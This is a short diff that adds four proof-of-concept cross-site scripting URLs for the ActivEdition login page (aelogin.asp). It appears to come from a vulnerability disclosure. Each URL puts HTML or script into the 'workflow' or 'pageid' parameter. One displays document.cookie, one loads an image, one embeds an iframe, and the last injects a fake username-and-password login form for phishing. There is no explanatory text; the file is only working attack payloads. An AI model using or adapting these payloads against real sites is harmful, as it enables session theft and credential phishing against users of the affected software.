@@ -1,0 +1,7 @@
+http://www.example.com/activedition/aelogin.asp?status=Fail&noreset=True&workflow='&quot;&lt;script&gt;&lt;img src=&quot;x&quot; onerror='alert(document.cookie)'&liststatus=&area=&pageid=
+
+http://www.example.com/activedition/aelogin.asp?status=Fail&noreset=True&workflow='&quot;&lt;script&gt;&lt;img src=&quot;http://www.example.com/images/logo_procheckup.gif&liststatus=&area=&pageid=
+
+http://www.example.com/activedition/aelogin.asp?status=Fail&noreset=True&workflow='&quot;&lt;script&gt;&lt;iframe%20src=&quot;http://www.example.com&quot; width=&quot;600%&quot; height=&quot;300%&quot;&liststatus=&area=&pageid=
+
+http://www.example.com/activedition/aelogin.asp?status=&noreset=False&workflow=&liststatus=&area=&pageid='&quot;&lt;script&gt;&lt;b&gt;User Name&lt;b&gt;&lt;BR&gt;&lt;input name=&quot;user&quot;&gt;&lt;BR&gt;&lt;b&gt;Password&lt;b&gt;&lt;BR&gt;&lt;input type = &quot;password&quot; name=&quot;pass&quot;&gt;&lt;button onClick=&quot;&quot;&gt;Log in&lt;/button
